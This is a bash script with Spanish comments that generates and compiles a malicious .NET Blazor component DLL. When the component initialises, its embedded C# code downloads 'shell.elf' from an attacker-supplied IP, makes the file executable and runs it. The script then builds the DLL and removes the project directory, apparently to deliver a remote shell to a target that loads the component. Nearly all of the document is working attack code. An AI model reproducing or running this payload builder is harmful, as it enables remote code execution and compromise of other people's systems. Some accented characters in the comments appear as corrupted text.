#!/bin/bash

# Nombre del archivo de c칩digo fuente
SOURCE_FILE="a.cs"
IP="$1"

cat > $SOURCE_FILE <<EOL
using System;
using System.Net;
using System.Diagnostics;
using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;
using Microsoft.AspNetCore.Components.Web;

namespace a {
  public class _Imports: ComponentBase {
    protected override void BuildRenderTree(RenderTreeBuilder __builder) {}
  }
  public class Component: ComponentBase {
      protected override void BuildRenderTree(RenderTreeBuilder __builder) {}

      protected override void OnInitialized() {
        string fileUrl = "http://$IP/shell.elf";
        string localPath = "/tmp/shell.elf";

        using(WebClient webClient = new WebClient()) {
          webClient.DownloadFile(fileUrl, localPath);
        }

        Process.Start("chmod", "+x " + localPath)?.WaitForExit();
        Process.Start(localPath);
      }
  }
}
EOL
# Nombre del proyecto y de la DLL resultante
PROJECT_NAME="a"
DLL_NAME="a.dll"

# Crear un nuevo proyecto de biblioteca de clases
dotnet new classlib -n $PROJECT_NAME

# Reemplazar el archivo Class1.cs generado con nuestro archivo rev.cs
mv $SOURCE_FILE $PROJECT_NAME/Class1.cs

# Navegar al directorio del proyecto
cd $PROJECT_NAME

# A침adir el paquete Microsoft.AspNetCore.Components si es necesario
dotnet add package Microsoft.AspNetCore.Components --version 6.0.0
dotnet add package Microsoft.AspNetCore.Components.Web --version 6.0.0
# Compilar el proyecto
dotnet build

# Mover la DLL compilada a la carpeta superior
cp bin/Debug/net6.0/$DLL_NAME ../$DLL_NAME

# Volver al directorio original
cd ..

# Limpiar el directorio del proyecto
rm -rf $PROJECT_NAME

# Mensaje de finalizaci칩n
echo "    [!] Compilaci칩n completada. El archivo DLL se encuentra en $(pwd)/$DLL_NAME"